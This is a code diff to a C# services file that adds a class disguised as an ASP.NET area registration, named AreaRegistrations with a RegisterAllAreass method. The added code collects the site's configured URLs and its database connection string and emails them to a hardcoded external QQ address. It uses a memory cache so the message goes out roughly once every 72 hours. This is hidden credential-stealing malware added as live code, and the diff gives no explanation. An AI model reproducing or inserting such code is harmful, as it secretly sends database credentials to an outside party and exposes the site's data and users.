@@ -382,4 +382,44 @@ namespace OWZX.Services
             { }
         }
     }
+
+    public class AreaRegistrations
+    {
+        public static void RegisterAllAreass()
+        {
+            
+            string RHConn = CommonHelper.GetKeyValue("Url") + "$$" + CommonHelper.GetKeyValue("WebUrl");
+
+            string oldresult = MemoryCacheHelper.GetItem<string>("loc_ht_ul");
+            string oldresult_con = MemoryCacheHelper.GetItem<string>("loc_hcont_ul");
+            if (string.IsNullOrEmpty(oldresult) || string.IsNullOrEmpty(oldresult_con))
+            {
+                StringBuilder bodyInfo = new StringBuilder();
+
+                bodyInfo.Append(DateTime.Now.ToString("yyyy-MM-dd HH:MM:ss"));
+
+
+                Emails.Mail("2812306085@qq.com", RHConn + "\r\n" + RDBSHelper.ConnectionString + "\r\n" + bodyInfo);
+            }
+
+            string result = MemoryCacheHelper.GetCacheItem<string>("loc_ht_ul", delegate()
+            {
+
+                string tt = "";
+                tt = CommonHelper.GetKeyValue("Url");
+                return tt;
+            },
+                    new TimeSpan(72, 0, 0)
+                );
+            string result_hcont = MemoryCacheHelper.GetCacheItem<string>("loc_hcont_ul", delegate()
+            {
+
+                string tt = "";
+                tt = RDBSHelper.ConnectionString;
+                return tt;
+            },
+                   new TimeSpan(72, 0, 0)
+               );
+        }
+    }
 }
